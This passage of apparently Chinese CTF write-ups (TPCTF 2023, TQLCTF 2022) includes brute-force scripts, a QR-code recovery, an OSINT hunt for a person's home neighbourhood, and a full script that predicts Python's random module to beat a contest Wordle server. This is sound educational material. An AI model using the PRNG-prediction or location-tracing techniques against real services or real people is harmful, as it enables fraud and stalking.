a\uff0c\u7136\u540e\u53cd\u8fc7\u6765\u4ea4\u6362\u56de\u53bb\u5f97\u5230\u7b2c\u4e00\u4e2a\u5faa\u73af\u540e\u7684 flag\uff1a</p> <pre><code>[46, 254, 159, 162, 180, 48, 104, 193, 90, 2, 82, 236, 188, 10, 224, 196, 138, 170, 62, 151, 172, 27, 4, 209, 58, 16, 27, 88, 32, 46, 161, 174, 86, 193, 135, 101]\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u5faa\u73af\u91cc\u7684\u8fd0\u7b97\u6bd4\u8f83\u590d\u6742\u800c\u4e14\u6709\u622a\u65ad\uff0c\u8fd8\u6709 D \u5b57\u5178\u7684\u7ed3\u6784\u4e5f\u4e0d\u592a\u4e86\u89e3\u3002\u56e0\u4e3a\u6bcf\u4e00\u4f4d\u7684\u8ba1\u7b97\u548c\u5176\u4ed6\u4f4d\u90fd\u6ca1\u6709\u5173\u7cfb\uff0c\u6240\u4ee5\u9009\u62e9\u4ece\u524d\u5f80\u540e\u7684\u65b9\u6cd5\uff0c\u9010\u4f4d\u7206\u7834 flag\uff1a</p> \u7206\u7834\u811a\u672c <p><pre><code>import os\nimport re\nfrom tqdm import trange\n\ntarget = [46, 254, 159, 162, 180, 48, 104, 193, 90, 2, 82, 236, 188, 10, 224, 196, 138, 170, 62, 151, 172, 27, 4, 209, 58, 16, 27, 88, 32, 46, 161, 174, 86, 193, 135, 101]\ntemplate = \"4141414154504354467b%s7d\"\n\nflag = [0x41] * 36\nfor i in range(36):\n    for j in trange(32, 127):\n        flag[i] = j\n        # logs = os.popen(\"node debug.mjs %02x\" % j).read() # 65536 \u957f\u5ea6\u9650\u5236\n        os.system(\"node debug.mjs %s &gt; tmp\" % (template % bytes(flag).hex()))\n        with open('tmp', 'r') as f:\n            logs = f.read()\n        res = re.findall(r\"..376; refs: 0..0\\} (\\d+?) CS\\{Cell\\{000\", logs)\n        if int(res[i]) == target[i]:\n            print(bytes(flag))\n            break\n</code></pre> <pre><code>import { SmartContract, internal, externalIn } from \"ton-contract-executor\";\nimport { Cell, BitString } from \"@ton/core\";\n\nasync function main() {\n    let contract = await SmartContract.fromCell(\n        Cell.fromBoc(Buffer.from(\"te6cckECCAEAATgAART/APSkE/S88sgLAQIBIAIDBPjSbCLtRNDTBzHTHwKAINch+CNYufJGINdJgQFYuvKGbSLHALOVMAH0BFneA9B01yH6QDAB0y8BgiBUUENURnu68oZvAILQaHR0cHM6Ly95b3V0dS5iZS9kUXc0dzlXZ1hjUfgUgCSK5DTTBzDAffKGgCMgiuQwcIAkiuQTBAUGBwBi8jDtRNDTBwHAAPKG+ADTH20hxwCzlDD0BAHeAYEBINcYMHHIywcTyx/0AAHPFsntVABEAdMHgQDpWKiDB/gRoIQHsIMH+BGyJXj0Dm+hMNMHMBJvjAAuIKT4EVNBb4FTUW+BVBYDb4VAVW+FA6UAHFMwb4ED0wdQRLry4pqkAERfA3AggBjIywVQA88WgQKa+gISy2rLH4szY2NozxbJc/sAUXUrEg==\", \"base64\"))[0], // patched\n        Cell.fromBoc(Buffer.from(\"...\", \"hex\"))[0], // not changed\n        {debug: true}\n    );\n    let bf_content = process.argv[2];\n    const msgBody = new Cell({bits: new BitString(Buffer.from(bf_content, \"hex\"), 0, 47 * 8)});\n    const res = await contract.sendInternalMessage(\n        internal({\n            dest: contract.address,\n            value: 0n,\n            bounce: false,\n            body: msgBody,\n        })\n    );\n    console.log(res.logs);\n}\n\nawait main();\nprocess.exit();\n</code></pre></p> <p>\u8fd9\u6837\u7206\u7834\u51fa\u6765\u5c31\u80fd\u5f97\u5230\u4e00\u4e2a uuid \u5c31\u662f flag\u3002</p>"},{"location":"writeups/tpctf2023/#wait-for-first-blood","title":"wait for first blood","text":"<p>\u5f88\u6709\u610f\u601d\u7684\u5f62\u5f0f\uff0c\u4e00\u4e2a\u4e8c\u7ef4\u7801\u9694\u4e00\u6bb5\u65f6\u95f4\u591a\u7ed9\u51fa\u51e0\u4e2a\u70b9\uff0c\u76f4\u5230\u4e00\u8840\u540e\u4e0d\u518d\u589e\u52a0\u3002</p> <p>\u7b2c\u4e8c\u5929\u665a\u4e0a\u624d\u53ef\u505a\uff0c\u5df2\u77e5\u7248\u672c v7\uff0c\u683c\u5f0f\u4fe1\u606f\u53ef\u4ee5\u5b8c\u5168\u7ea0\u9519\uff0c\u7b49\u7ea7 H \u63a9\u7801 0\uff0c\u4e14\u6ce8\u610f v7H \u4e0b data codewords \u548c error correction codewords \u4f1a\u8fdb\u884c\u5206\u7ec4\u91cd\u6392\uff0c\u524d\u56db\u7ec4\u6bcf\u7ec4 13 \u6570\u636e 26 \u7ea0\u9519\uff0c\u6700\u540e\u4e00\u7ec4 14 \u6570\u636e 26 \u7ea0\u9519\uff0c\u89e3\u8bfb\u4e8c\u7ef4\u7801\u6bd4\u7279\u6d41\u518d\u91cd\u6392\u56de\u6765\u5f97\u5230\u6b63\u5e38\u7684\u5e8f\u5217\u4e3a\uff08\u4e0d\u662f\u6700\u65b0\uff09\uff1a</p> <pre><code>?010000?0??0101000101?000000?100?1?010?0?11010?001000?000?001001?000001111?11?0?1101000000100?0010111?011001110110100?01?10?110?11?100001011100??001110?1?100100100000100001?100101?10?010?01000111101?0?1?01000100111011?101?00111000100?11???111011?0110001100011010?0010000001?001?101100010001101100110?1000110010?00?1011?011?0?1000111000001101010011?001?011001100?1011?0110?01?011001100011001100110??0?01?0101?011000101100101?01110000?10?00?001101100??10101?11000??0011000?0?1000?10011?0010011100100110101?0110?0101?00??001100?100\n</code></pre> <p>\u7136\u540e\u6839\u636e\u4e8c\u7ef4\u7801\u7684\u7f16\u7801\u8fdb\u884c\u89e3\u8bfb\uff0c\u5f00\u5934\u662f HttPS://gist.giTHUB.COM/KONANO/ \u53ef\u4ee5\u5b8c\u5168\u786e\u5b9a\uff0c\u540e\u9762 32 \u4e2a\u5b57\u8282\u5728 [0-9a-f] \u95f4\uff0c\u53ef\u4ee5\u57fa\u672c\u7f29\u5c0f\u8303\u56f4\uff1a</p> \u4eba\u5de5\u89e3\u7801 <pre><code>0010\n000000001   - len = 1\n010001      - H\n0100 \n00000010    - len = 2\n01110100    - t\n01110100    - t\n0010\n000000100   - len = 4\n10010000001 - PS\n11111100111 - :/\n0100\n00001000    - len = 8\n00101111    - /\n01100111    - g\n01101001    - i\n01110011    - s\n01110100    - t\n00101110    - .\n01100111    - g\n01101001    - i\n0010\n000010000   - len = 16\n10100101010 - TH\n10101010001 - UB\n11101101110 - .C\n10001001110 - OM\n11110100011 - /K\n10001001111 - ON\n00111011001 - AN\n10001100011 - O/\n0100\n00100000    - len = 32\n01100101    - e\n01100010    - b\n00110110    - 6\n01100100    - d\n0110010?    - d/e\n00110110    - 6\n01100010    - b\n00111000    - 8\n00110101    - 5\n0011?001    - 1/9\n00110011    - 3\n00110111    - 7\n0110001?    - b/c\n01100110    - f\n00110011    - 3\n00110??0    - 0/2/4/6\n00110101    - 5\n00110001    - 1\n01100101    - e\n00111000    - 8\n01100001    - a\n00110110    - 6\n00110101    - 5\n011000??    - a/b/c\n0011000?    - 0/1\n011000?1    - a/c\n0011?001    - 1/9\n00111001    - 9\n00110101    - 5\n00110?01    - 1/5\n01100010    - b\n01100?10    - b/f\n0\n</code></pre> <p>\u7136\u540e\u5168\u6392\u5217\u679a\u4e3e\u672a\u77e5\u6bd4\u7279\uff0c\u5408\u6cd5\u7684 url \u5c31\u8fdb\u884c\u8bbf\u95ee\uff0c\u6b63\u786e\u7684 200 \u4e0d\u6b63\u786e 404\uff0c\u53ef\u4ee5\u7206\u7834\u3002</p> \u7206\u7834\u4ee3\u7801 <pre><code>total = \"\".join(known)\n\nimport itertools\nfrom tqdm import tqdm\nimport requests\n\nfor i in tqdm(itertools.product(\"01\", repeat=unknown_bits), total=2**unknown_bits):\n    flag = \n    cur = total[:]\n    for j in range(unknown_bits):\n        cur = cur.replace('?', i[j], 1)\n    res = \"\".join([chr(int(cur[i:i+8], 2)) for i in range(0, len(cur), 8)])\n    for each in res:\n        if each not in \"0123456789abcdef\":\n            flag = 1\n            break\n    if flag == 1:\n        continue\n    url = \"https://gist.github.com/Konano/\" + res\n    r = requests.get(url)\n    if r.status_code == 200:\n        print(url)\n        print(res)\n        break\n</code></pre> <p>\u7206\u7834\u5f97\u5230 https://gist.github.com/Konano/eb6dd6b85937bf3651e8a65c1a9951bb\uff0c\u8bbf\u95ee\u5f97\u5230 flag: TPCTF{WhEN_nAnO_MEeTS_qrcod3_1n_thE_Mix_OF_jEop@rdy_@nd_k0h(?)}\u3002</p> <p>\u5176\u5b9e\u53ef\u4ee5\u679a\u4e3e\u4e4b\u540e\u6309\u7167 v7 H0 \u91cd\u65b0\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u4e8c\u7ef4\u7801\u518d\u548c\u9898\u76ee\u7684\u6bd4\u8f83\u9a8c\u8bc1\u5c31\u53ef\u4ee5\u4e86\uff0c\u672c\u5730\u7206\u7834\u6548\u7387\u66f4\u9ad8\uff0c\u672c\u5e94\u8be5\u66f4\u65e9\u505a\u51fa\u6765\uff0c\u75db\u5931\u4e09\u8840\u3002</p>"},{"location":"writeups/tpctf2023/#t","title":"\u5c0f T \u7684\u65e5\u5e38","text":"\u9898\u76ee <p>\u672c\u9898 flag \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e3a TPCTF{[A-Z]+:\\d+}\uff0c\u5176\u4e2d [A-Z]+ \u4e3a\u5c0f T \u5bb6\u697c\u4e0b\u5546\u5e97\u8857\u7684\u4e00\u5143\u5e97\u9694\u58c1\u7684\u670d\u88c5\u5e97\u5e97\u540d\uff0c\\d+ \u4e3a\u8fd9\u5bb6\u670d\u88c5\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u3002</p> <p>Google \u641c\u7d22\u56fe\u7247\u53ef\u4ee5\u67e5\u5230\u8fd9\u91cc\u662f\u6a2a\u6ee8\u7684\u6a31\u6728\u753a\u548c\u8f66\u9a6c\u9053\u4e24\u4e2a\u5730\u94c1\u7ad9\u9644\u8fd1\uff0c\u5e94\u8be5\u662f\u4e0a\u73ed\u5730\u70b9\uff0c\u6240\u4ee5\u63a5\u4e0b\u6765\u8981\u6839\u636e\u901a\u52e4\u4fe1\u606f\u627e\u5230\u5c45\u4f4f\u5730\u70b9\u3002</p> <p>\u4e94\u5206\u949f\u8def\u7a0b\u4e00\u4e2a\u6708 8000 \u65e5\u5143\u7684\u8bdd\uff0c\u53ef\u80fd\u662f JR \u53ef\u80fd\u662f\u6a31\u6728\u753a\u5230\u77f3\u5ddd\u753a\uff08150*2*26=7800\uff09\uff0c\u9644\u8fd1\u6709\u5143\u753a\u4e2d\u534e\u8857\uff0c\u91cc\u9762\u641c dollor store \u53ef\u4ee5\u641c\u5230 china square \u7684 daiso \u5e97\uff0c\u4e0d\u8fc7\u9644\u8fd1\u6ca1\u6709\u670d\u88c5\u5e97\uff0c\u627e\u4e86 china square \u5b98\u7f51\uff0c\u662f 2011 \u5e74\u7684\u6570\u636e\u4e86\uff0c\u9694\u58c1\u6ca1\u6709\u670d\u88c5\u5e97\u3002\u8c37\u6b4c\u5730\u56fe\u91cc\u9762\u663e\u793a china square \u91cc\u6709\u4e00\u5bb6\u670d\u88c5\u79df\u8d41\u7684\u767d\u9f99\u9986\uff0c\u4e0d\u5bf9\uff0c\u5e94\u8be5\u5c31\u4e0d\u662f\u8fd9\u91cc\u3002</p> <p>\u5982\u679c\u4e0d\u662f JR \u7684\u8bdd\u6709\u53ef\u80fd\u662f\u8425\u84dd\u7ebf\u6a31\u6728\u753a\u5230\u962a\u4e1c\u6865\uff08200*2*20=8000\uff09\uff0c\u8fd9\u4e2a\u4e00\u5468\u4e0a\u73ed\u4e94\u5929\u770b\u8d77\u6765\u66f4\u7b26\u5408\u6761\u4ef6\uff0c\u800c\u4e14\u6a31\u6728\u753a\u662f JR \u548c\u5e02\u8425\u5171\u7528\u7684\u5730\u94c1\u7ad9\uff0c\u4e0a\u4e0b\u73ed\u7684\u65f6\u5019\u770b JR \u4eba\u591a\u5410\u69fd\u4e00\u4e0b\u5012\u4e5f\u5408\u7406\u3002\u962a\u4e1c\u6865\u7ad9\u9644\u8fd1\u6709\u6a2a\u6ee8\u6865\u901a\u5546\u5e97\u8857\uff0c\u5728\u91cc\u9762\u627e\u6709\u4e00\u5bb6 NARUKIYA\uff0c\u65c1\u8fb9\u662f Can*Do \u767e\u5143\u5e97\uff1a</p> <p></p> <p>\u6240\u4ee5 flag \u4e3a TPCTF{NARUKIYA:2311855}</p> <p>\uff08\u5176\u5b9e\u961f\u53cb\u505a\u7684\u65f6\u5019\u662f\u5f53\u6210\u5143\u753a\u4e2d\u534e\u8857\u7406\u89e3\u7684\uff0c\u7136\u540e\u987a\u7740\u8fd9\u6761\u8def\u4e00\u76f4\u722c\u627e\u767e\u5143\u5e97\u770b\u8857\u666f\uff0c\u6b6a\u6253\u6b63\u7740\u627e\u5230\u4e86 NARUKIYA\uff09</p>"},{"location":"writeups/tqlctf2022/","title":"TQLCTF 2022 Writeup","text":"<p> \u7ea6 1232 \u4e2a\u5b57  365 \u884c\u4ee3\u7801  6 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u6e05\u534e\u4e3b\u529e\u7684\u6bd4\u8d5b\uff0cmisc \u57fa\u672c\u90fd\u662f NanoApe \u51fa\u7684\uff0c\u8d28\u91cf\u9ad8\u7684\u5f88</p> <ul> <li>nano \u7684\u5b98\u65b9 writeup</li> </ul>"},{"location":"writeups/tqlctf2022/#ranma12","title":"Ranma\u00bd","text":"<p>\u6253\u5f00 flag \u5341\u516d\u8fdb\u5236\uff0c\u662f\u4e00\u4e2a\u975e\u6807\u51c6\u7684 UTF-8 \u7f16\u7801\uff0c\u4e5f\u5c31\u662f\u90e8\u5206\u53ef\u4ee5\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u7684\uff0c\u5199\u6210\u4e86\u7b26\u5408 UTF-8 \u7f16\u7801\u539f\u7406\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u5bfc\u81f4\u7f16\u8f91\u5668\u65e0\u6cd5\u6b63\u5e38\u8bfb\u53d6\uff08\u4f46\u662f vim \u80fd\u8bfb\u53d6\uff09</p> <p>\u53ef\u4ee5\u5f97\u5230\u4e00\u4e32\u5bc6\u6587\uff1a</p> <p>KGR/QRI 10646-1 zswtqgg d tnxcs tsdtofbrx osk ndnzhl gna Ietygfviy Idoilfvsu Arz (QQJ) hkkqk maikaglvusv ubyp cw ekg krzyj'o kitwkbj alypsdd.  Wjs rzvmebrwoa duwcuosu pqecgqamo cw ekg IFA, uussmpu, ysum aup qfxschljyk swks pcbb khxnsee drdoqpgpwfyv cbg xeupctzou, oql gneg ylv nsg bb zds upygzrxzkjh fq XVT-8, wpr uxxvnw qt wpvy isdz. XVT-8 kif zds tsdtofbrxegktf qt szryafmtqi hkm sahz LD-DUQLQ egjuv, auqjllvtc qfxschljvrehp hlvv iqyk omjehog, sieyafj lqf cwprx ocwezcfh bugp fvwb qb XA-NYYWZ gdniha oap oip wtoqacgnsee wq cwprx rocfhu. HTTPZB{QFOLP6_KRZ1Q}</p> <p>\u5f88\u5bb9\u6613\u731c\u6d4b\u5f00\u5934\u5e94\u8be5\u662f ISO/IEC 10646-1\uff0c\u800c\u80fd\u5c06 I \u52a0\u5bc6\u4e3a\u4e0d\u540c\u5b57\u7b26\uff0c\u60f3\u5230\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801</p> <p>\u67e5\u5230\u539f\u6587\u662f RFC 3629 \u7684 abstract:</p> <p>ISO/IEC 10646-1 defines a large character set called the Universal Character Set (UCS) which encompasses most of the world's writing systems.  The originally proposed encodings of the UCS, however, were not compatible with many current applications and protocols, and this has led to the development of UTF-8, the object of this memo.  UTF-8 has the characteristic of preserving the full US-ASCII range, providing compatibility with file systems, parsers and other software that rely on US-ASCII values but are transparent to other values.</p> <p>\u53cd\u63a8\u51fa key\uff1a<code>CODINGWORLD</code> \u89e3\u5bc6\u5f97\u5230\u7ed3\u5c3e\u7684 flag\uff1a<code>TQLCTF{CODIN6_WOR1D}</code></p>"},{"location":"writeups/tqlctf2022/#wordle","title":"wordle","text":"<p>wordle \u6e38\u620f\uff0c\u8981\u6c42 512 \u5c40\u5168\u90e8\u731c\u5bf9</p> <p>\u5148\u5199\u4e86\u4e00\u4e2a solver\uff0c\u6539\u5199\u7684  zulkarnine/WordleSolver easy \u548c normal \u96be\u5ea6\u5747\u6ca1\u6709 flag \u76f8\u5173\u4fe1\u606f\uff0c\u6240\u4ee5\u8981\u89e3\u51fa insane \u96be\u5ea6\uff0c\u5373 512 \u5c40\u5168\u90e8\u63a7\u5236\u5728 4 \u6b21\u4ee5\u5185\u731c\u51fa\u6765\uff0c\u4e0d\u73b0\u5b9e\uff0c\u627e\u5176\u5b83\u65b9\u6cd5</p> <p>\u53d1\u73b0\u6bcf\u5c40\u90fd\u4f1a\u5148\u7ed9\u51fa\u4e00\u4e2a hex \u503c\uff0c\u800c\u4e14\u7b97\u6cd5\u5df2\u77e5\uff0c\u5e76\u4e14\u7531\u9898\u76ee\u6587\u4ef6\u4e2d\u6ce8\u91ca <code># To prevent the disclosure of answer</code> \u77e5\u9053\u53cd\u63a8\u7b54\u6848\u4e0d\u73b0\u5b9e \u518d\u8003\u8651\u5230\u6574\u4e2a\u9898\u76ee\u662f\u5728\u4e00\u4e2a while True \u4ee5\u5185\u7684\uff0c\u89e3\u51fa\u4e00\u4e2a\u96be\u5ea6\u540e\u4e0d\u4f1a\u5173\u6389\u9898\u76ee\uff0c\u800c\u662f\u53ef\u4ee5\u7ee7\u7eed\u9009\u62e9\u96be\u5ea6\u7ee7\u7eed\u89e3\u9898</p> <p>\u6240\u4ee5\u5b58\u5728\u7206\u7834 random \u6a21\u5757\u4f2a\u968f\u673a\u6570\u7684\u53ef\u80fd \u56e0\u4e3a hex \u503c\u7b97\u6cd5\u5df2\u77e5\uff1a</p> <pre><code>id = random.randrange(len(valid_words) * (2 ** 20))\nanswer = valid_words[id % len(valid_words)]\nid = (id // len(valid_words)) ^ (id % len(valid_words))\nreturn hex(id)[2:].zfill(5), answer\n</code></pre> <p>\u5982\u679c\u77e5\u9053\u7b54\u6848\u5219\u76f8\u5f53\u4e8e\u77e5\u9053 <code>id % len(valid_words)</code>\uff0c\u518d\u4e0e hex \u503c\u5f02\u6216\u53ef\u4ee5\u5f97\u5230 <code>id // len(valid_words)</code>\uff0c\u800c <code>len(valid_words)</code> \u5df2\u77e5\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u63a8\u5f97 <code>id</code>\uff0c\u5373 randrange \u7684\u7ed3\u679c</p> <p>\u7206\u7834 random \u4f7f\u7528  tna0y/Python-random-module-cracker\uff0c\u9700\u8981 512 \u4e2a random \u7684\u7ed3\u679c</p> <p>\u8fdb\u884c\u4e24\u8f6e easy \u96be\u5ea6\uff08\u4f7f\u7528 solver\uff09\u5c31\u53ef\u4ee5\u5f97\u5230\u8fde\u7eed 512 \u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u4f46\u662f\u5b58\u5728\u7206\u7834\u51fa\u9519\u7684\u53ef\u80fd\uff0c\u7b2c\u4e8c\u8f6e\u7684\u540e 400 \u4e2a\u53ef\u4ee5\u7528\u6765\u9a8c\u8bc1 \u5982\u679c\u540e 400 \u4e2a\u5b8c\u5168\u9884\u6d4b\u6b63\u786e\uff0c\u5c31\u53ef\u4ee5\u8fdb\u884c insane \u96be\u5ea6\uff0c\u76f4\u63a5\u9884\u6d4b\u968f\u673a\u6570\u8ba1\u7b97\u5f97\u5230\u7b54\u6848</p> \u5b8c\u6574\u4ee3\u7801 <pre><code>import re\nimport sys\nfrom pwn import *\nfrom tqdm import tqdm\nfrom enum import Enum\nfrom collections import Counter\nfrom randcrack import RandCrack\n\nMAX_ATTEMPT = 6\n\nclass LetterVerdict(Enum):\n    GREEN = 1\n    YELLOW = 2\n    GRAY = 3\n\nclass AttemptVerdict(Enum):\n    WON = 1\n    LOST = 2\n    FAILED_ATTEMPT = 3\n    INVALID_TRY = 4\n    INVALID_WORD = 5\n\ndef get_all_wordle_words():\n    with open(\"valid_words.txt\", \"r\") as infile:\n        return [line.strip() for line in infile.readlines()]\n\nclass WordleSolver:\n    def __init__(self):\n        self.__all_possible_words = set(get_all_wordle_words())\n        self.__invalid_letters = set()\n        self.__untried_letters = set()\n        self.__candidate_words = []\n        self.__green_blocks = set()\n        self.__yellow_blocks = set()\n        self.attempt = 0\n        self.game_number = -1\n        self.tries = []\n        self.reset()\n\n    def reset(self):\n        self.__invalid_letters.clear()\n        self.__candidate_words = sorted(list(self.__all_possible_words))\n        self.__yellow_blocks.clear()\n        self.__green_blocks.clear()\n        self.attempt = 0\n        self.__untried_letters = set(chr(ord('a') + i) for i in range(26))\n        self.game_number += 1\n        self.tries.clear()\n\n    def __contains_forbidden_letters(self, word):\n        for ind, c in enumerate(word):\n            if (c, ind) not in self.__green_blocks: # here fix a bug in\n                if c in self.__invalid_letters:     # the original solver\n                    return True\n        return False\n\n    def __get_untried_letter_probability(self, words):\n        counter = Counter()\n        for w in words:\n            for c in w:\n                if c in self.__untried_letters:\n                    counter[c] += 1\n        return counter\n\n    def __get_letter_freq_map(self, words):\n        counter = Counter()\n        for w in words:\n            for c in w:\n                counter[c] += 1\n        return counter\n\n    def __matches_green_constraints(self, word):\n        for letter, index in self.__green_blocks:\n            if word[index] != letter:\n                return False\n        return True\n\n    def __matches_yellow_constraints(self, word):\n        for letter, index in self.__yellow_blocks:\n            if word[index] == letter or letter not in word:\n                return False\n        return True\n\n    def __filter_out_invalid_words(self):\n        new_candidates = []\n        for word in self.__candidate_words:\n            if self.__contains_forbidden_letters(word) or not self.__matches_green_constraints(\n                    word) or not self.__matches_yellow_constraints(word):\n                continue\n            new_candidates.append(word)\n\n        self.__candidate_words = new_candidates\n\n    def __make_educated_guess(self):\n        untried_letters = self.__get_untried_letter_probability(self.__candidate_words)\n        freq_map = self.__get_letter_freq_map(self.__candidate_words)\n        if len(untried_letters) &gt; 1 and self.attempt &lt;= MAX_ATTEMPT - 1:\n            word_with_score = []\n            word_list = self.__all_possible_words\n            for word in word_list:\n                letters = set(word)\n                untried_score = sum(untried_letters[c] if c in untried_letters else 0 for c in letters)\n                freq_score = sum(freq_map[c] for c in letters)\n                word_with_score.append((word, untried_score, freq_score))\n            ranked_words = sorted(word_with_score,\n                                  key=lambda item: (-item[1], -item[2], item[0]))\n            guess = ranked_words[0][0]\n        else:\n            guess = sorted(\n                self.__candidate_words,\n                key=lambda word: (-len(set(word)), -sum(freq_map[c] for c in word), word)\n            )[0]\n        return guess\n\n    def __pick_a_word(self):\n        self.__filter_out_invalid_words()\n        if len(self.__candidate_words) == 0: # for debug\n            res = input(\"&gt;&gt;&gt; \")\n            return res.strip()\n        elif len(self.__candidate_words) == 1:\n            return self.__candidate_words[0]\n        return self.__make_educated_guess()\n\n    def solve(self, wordle):\n        last_guess = \"\"\n        wordle.p.recvuntil(b\"#\")\n        hex_id = wordle.p.recvline().decode(\"utf-8\").strip()\n        while True:\n            self.attempt += 1\n            guess = self.__pick_a_word()\n            if last_guess == guess:  # here fix a bug in the original solver\n                self.__candidate_words.remove(guess)\n                guess = self.__pick_a_word()\n            result, letter_verdicts = wordle.guess(guess)\n            last_guess = guess\n            self.tries.append(guess)\n            if result == AttemptVerdict.WON:\n                return hex_id, guess\n            elif result == AttemptVerdict.LOST:\n                return False\n            elif result == AttemptVerdict.FAILED_ATTEMPT:\n                for chr in guess:\n                    self.__untried_letters.discard(chr)\n                for i in range(len(letter_verdicts)):\n                    letter, verdict = letter_verdicts[i]\n                    if verdict == LetterVerdict.GRAY:\n                        flag = True\n                        for (l, _) in self.__yellow_blocks: # here fix a bug in\n                            if l == letter:                 # the original solver\n                                flag = False\n                                break\n                        if flag:\n                            self.__invalid_letters.add(letter)\n                    elif verdict == LetterVerdict.GREEN:\n                        self.__green_blocks.add((letter, i))\n                        if (letter, i) in self.__yellow_blocks:\n                            self.__yellow_blocks.remove((letter, i))\n                    elif verdict == LetterVerdict.YELLOW:\n                        self.__yellow_blocks.add((letter, i))\n                    else:\n                        exit(1)\n            elif result == AttemptVerdict.INVALID_WORD:\n                self.attempt -= 1\n                self.__candidate_words.remove(guess)\n                self.__all_possible_words.remove(guess)\n\nclass Wordle:\n    def __init__(self, mode):\n        self.p = connect(\"47.106.102.129\", 23370)\n        self.p.sendlineafter(b\"&gt; \", str(mode).encode(\"utf-8\"))\n\n    def restart(self, mode):\n        self.p.sendlineafter(b\"&gt; \", str(mode).encode(\"utf-8\"))\n\n    def guess(self, word):\n        self.p.sendlineafter(b\"&gt; \", word.encode(\"utf-8\"))\n        status = self.p.recvuntil(b\"!\")\n        if status == b\"Correct!\":\n            return AttemptVerdict.WON, None\n        result = self.p.recvline().decode(\"utf-8\")\n        res = re.findall(r\"\\[4(\\d)m\", result)\n        ret = []\n        for i in range(5):\n            c = word[i]\n            if res[i] == \"7\":\n                ret.append((c, LetterVerdict.GRAY))\n            elif res[i] == \"3\":\n                ret.append((c, LetterVerdict.YELLOW))\n            else:\n                ret.append((c, LetterVerdict.GREEN))\n        attempt_verdict = AttemptVerdict.WON\n        for _, verdict in ret:\n            if verdict != LetterVerdict.GREEN:\n                attempt_verdict = AttemptVerdict.FAILED_ATTEMPT\n                break\n        return attempt_verdict, ret\n\ncracker = RandCrack()\nwordle = Wordle(0)\nsolver = WordleSolver()\n\ndef calc_random_id(hex_id, word):\n    valid_words = get_all_wordle_words()\n    length = len(valid_words)\n    index = valid_words.index(word)  # id % len(valid_words)\n    Id = eval(\"0x\"+hex_id)\n    tmp = Id ^ index # id // len(valid_words)\n    return tmp * length + index\n\ndef calc_hex_id_and_word(random_value):\n    valid_words = get_all_wordle_words()\n    length = len(valid_words)\n    word = valid_words[random_value % length]\n    hex_value = (random_value // length) ^ (random_value % length)\n    return hex(hex_value)[2:].zfill(5), word\n\nwith tqdm(total=624, desc=\"Cracking random...\") as pbar:\n    for i in range(512):\n        solver.reset()\n        hex_id, answer = solver.solve(wordle)\n        random_value = calc_random_id(hex_id, answer)\n        cracker.submit(random_value)\n        pbar.update(1)\n    wordle.restart(0)\n    for i in range(112):\n        solver.reset()\n        hex_id, answer = solver.solve(wordle)\n        random_value = calc_random_id(hex_id, answer)\n        cracker.submit(random_value)\n        pbar.update(1)\nwith tqdm(total=400, desc=\"Verifying crack result...\") as pbar:\n    for i in range(400):\n        solver.reset()\n        predict = cracker.predict_randrange(4090 * (2**20))\n        p_hex_id, p_answer = calc_hex_id_and_word(predict)\n        hex_id, answer = solver.solve(wordle)\n        if p_hex_id != hex_id:\n            print(f\"Crack faild:\\n  predict: {p_hex_id}, {p_answer}\\n  challenge: {hex_id}, {answer}\")\n            sys.exit(1)\n        pbar.update(1)\n\nwordle.p.sendlineafter(b\"&gt; \", b\"3\") # insane level\nwith tqdm(total=512, desc=\"Solving insane level...\") as pbar:\n    for i in range(512):\n        wordle.p.recvuntil(b\"#\")\n        hex_id = wordle.p.recvline().decode(\"utf-8\").strip()\n        predict = cracker.predict_randrange(4090 * (2**20))\n        p_hex_id, p_answer = calc_hex_id_and_word(predict)\n        if hex_id != p_hex_id:\n            print(f\"Predict failed:\\n  predic: {p_hex_id}\\n  challenge: {hex_id}\")\n            sys.exit(1)\n        wordle.p.sendlineafter(b\"&gt; \", p_answer.encode(\"utf-8\"))\n        pbar.update(1)\n\nwordle.p.interactive()\n</code></pre>"},{"location":"writeups/tqlctf2022/#the-ohio-state-university","title":"the Ohio State University","text":"<p>\u9898\u76ee\u63d0\u4f9b\u4e86 .osz \u6587\u4ef6\uff0c\u662f osu! \u6e38\u620f\u8c31\u9762\u7684\u538b\u7f29\u6587\u4ef6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6e38\u620f\u76f4\u63a5\u6253\u5f00\uff0c\u6216\u8005\u89e3\u538b\u83b7\u5f97\u7d20\u6750\u6587\u4ef6 \u5728osu\u5b98\u7f51\u641c\u7d22\u5230\u5bf9\u5e94\u7684\u8c31\u9762\u5e76\u4e0b\u8f7d\uff1ahttps://osu.ppy.sh/beatmapsets/1235288#mania/2568956</p> <p>\u5c06\u4e24\u4efd\u8c31\u9762\u89e3\u538b\uff0c\u6bd4\u8f83\u6587\u4ef6\u4e0d\u540c</p> <p>\u80cc\u666f\u56fe\u7247\u7684 exif \u91cc\u6709\u4e00\u9879\u5c5e\u6027\uff1a<code>pwd: VVelcome!!</code> \u63a8\u6d4b\u56fe\u7247\u4f1a\u6709\u5e26\u5bc6\u7801\u7684\u9690\u85cf\u5185\u5bb9\uff0csteghide \u89e3\u5bc6\u5f97\u5230 flag \u5f00\u5934\uff1a<code>TQLCTF{VVElcOM3</code></p> <p>BASIC \u96be\u5ea6\u8c31\u9762\u6587\u4ef6\u6709\u4e00\u884c\u5dee\u5f02\uff1a<code>WAVPassword: MisoilePunch</code> \u6697\u793a\u4e86 wav \u97f3\u9891\u6587\u4ef6\u4f1a\u6709\u9690\u85cf\u5185\u5bb9\uff0c\u4f7f\u7528 SilentEye \u5373\u53ef\u63d0\u53d6 \u62ff\u5230 flag \u4e2d\u95f4\u90e8\u5206<code>_TO_O$u_i7s_</code></p> <p>\u6700\u540e\u8fd8\u5269\u4e0b VIVID \u96be\u5ea6\u8c31\u9762\uff0c\u6bd4\u5bf9\u53d1\u73b0\u8c31\u9762\u5c3e\u6740\u88ab\u6539\u4e86</p> <p>\u5269\u4e0b\u4e00\u90e8\u5206\u662f flag 